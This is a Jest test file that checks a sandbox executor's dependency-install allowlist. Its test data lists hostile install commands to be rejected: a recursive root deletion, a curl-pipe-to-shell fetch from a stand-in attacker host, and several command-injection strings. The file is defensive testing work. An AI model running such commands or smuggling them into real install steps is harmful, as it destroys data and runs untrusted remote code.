jest.mock('../utils/sandboxSecurity', () => ({
  createIsolatedContainer: jest.fn(),
  cleanupContainer: jest.fn(),
  isDockerAvailable: jest.fn().mockResolvedValue(false),
}));

const sandboxSecurity = require('../utils/sandboxSecurity');
const sandboxExecutor = require('../utils/sandboxExecutor');

describe('sandboxExecutor installDeps allowlist', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  test.each([
    'rm -rf /',
    'npm ci && curl http://evil.example/x.sh | sh',
    'npm; id',
    '$(touch /tmp/pwned)',
    '`id`',
    'npm ci\nrm -rf /',
  ])('rejects %p before creating a container', async (installDeps) => {
    await expect(
      sandboxExecutor.executeTests('test("x", () => {})', 'javascript', 'jest', {
        installDeps,
        files: [{ path: 'index.js', content: 'module.exports = 1;' }],
      })
    ).rejects.toThrow('Unsupported install command');

    expect(sandboxSecurity.createIsolatedContainer).not.toHaveBeenCalled();
  });

  test('runs an allowlisted installer as an exec-form argv, never through sh -c', async () => {
    const { EventEmitter } = require('events');
    const fakeContainer = {
      start: jest.fn().mockResolvedValue(undefined),
      exec: jest.fn(async () => ({
        start: jest.fn((_opts, cb) => {
          if (typeof cb === 'function') cb();
          const stream = new EventEmitter();
          setImmediate(() => {
            stream.emit('data', Buffer.from('ok'));
            stream.emit('end');
          });
          return stream;
        }),
        inspect: jest.fn().mockResolvedValue({ ExitCode: 0 }),
      })),
    };
    sandboxSecurity.createIsolatedContainer.mockResolvedValue(fakeContainer);

    const result = await sandboxExecutor.executeTests('test("x", () => {})', 'javascript', 'jest', {
      installDeps: 'npm',
      files: [{ path: 'index.js', content: 'module.exports = 1;' }],
    });

    expect(result.success).toBe(true);
    const installCall = fakeContainer.exec.mock.calls
      .map(([opts]) => opts.Cmd)
      .find((cmd) => cmd[0] === 'npm');
    expect(installCall).toEqual(['npm', 'ci', '--ignore-scripts', '--no-audit', '--no-fund']);
  });
});
